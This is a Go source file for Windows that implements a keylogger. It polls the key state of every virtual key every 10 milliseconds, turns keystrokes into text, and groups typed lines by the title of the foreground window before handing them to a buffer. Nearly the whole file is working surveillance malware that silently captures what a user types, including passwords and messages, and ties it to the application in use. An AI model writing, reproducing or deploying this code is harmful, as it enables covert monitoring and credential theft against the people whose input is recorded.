//go:build windows

package keylogger

import (
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	user32                  = windows.NewLazyDLL("user32.dll")
	procGetAsyncKeyState    = user32.NewProc("GetAsyncKeyState")
	procGetKeyState         = user32.NewProc("GetKeyState")
	procGetForegroundWindow = user32.NewProc("GetForegroundWindow")
	procGetWindowTextW      = user32.NewProc("GetWindowTextW")
)

const (
	VK_RETURN  = 0x0D
	VK_SPACE   = 0x20
	VK_TAB     = 0x09
	VK_SHIFT   = 0x10
	VK_CONTROL = 0x11
	VK_MENU    = 0x12
	VK_CAPITAL = 0x14
	VK_DELETE  = 0x2E
	VK_BACK    = 0x08
)

func platformKeylogger() {
	keyStates := make(map[int]bool)
	var lineBuffer string
	var currentWindow string

	for isRunning {
		time.Sleep(10 * time.Millisecond)

		for key := 0; key < 256; key++ {
			state, _, _ := procGetAsyncKeyState.Call(uintptr(key))
			isPressed := (state & 0x8000) != 0

			if keyStates[key] != isPressed {
				if isPressed {
					keyStr := getKeyString(key)
					newWindow := getActiveWindowTitle()

					// If window changed, send previous line
					if newWindow != currentWindow && lineBuffer != "" {
						addToBuffer(KeyLog{
							Key:      lineBuffer,
							Window:   currentWindow,
							Time:     time.Now(),
							KeyState: "line",
						})
						lineBuffer = ""
					}

					currentWindow = newWindow

					if keyStr != "" {
						switch keyStr {
						case "[ENTER]", "[TAB]":
							// Send line and clear buffer
							if lineBuffer != "" {
								addToBuffer(KeyLog{
									Key:      lineBuffer,
									Window:   currentWindow,
									Time:     time.Now(),
									KeyState: "line",
								})
								lineBuffer = ""
							}
						case "[BACK]":
							if len(lineBuffer) > 0 {
								lineBuffer = lineBuffer[:len(lineBuffer)-1]
							}
						default:
							lineBuffer += keyStr
						}
					}
				}
				keyStates[key] = isPressed
			}
		}
	}
}

func getKeyString(key int) string {
	switch key {
	case VK_RETURN:
		return "[ENTER]"
	case VK_SPACE:
		return " "
	case VK_TAB:
		return "[TAB]"
	case VK_SHIFT:
		return "[SHIFT]"
	case VK_CONTROL:
		return "[CTRL]"
	case VK_MENU:
		return "[ALT]"
	case VK_CAPITAL:
		return "[CAPS]"
	case VK_DELETE:
		return "[DEL]"
	case VK_BACK:
		return "[BACK]"
	default:
		if key >= 'A' && key <= 'Z' {
			shift, _, _ := procGetKeyState.Call(uintptr(VK_SHIFT))
			if shift&0x8000 != 0 {
				return string(key)
			}
			return string(key + 32)
		}
	}
	return ""
}

func getActiveWindowTitle() string {
	hwnd, _, _ := procGetForegroundWindow.Call()
	if hwnd == 0 {
		return ""
	}

	buffer := make([]uint16, 256)
	_, _, _ = procGetWindowTextW.Call(
		hwnd,
		uintptr(unsafe.Pointer(&buffer[0])),
		uintptr(len(buffer)))

	return windows.UTF16ToString(buffer)
}
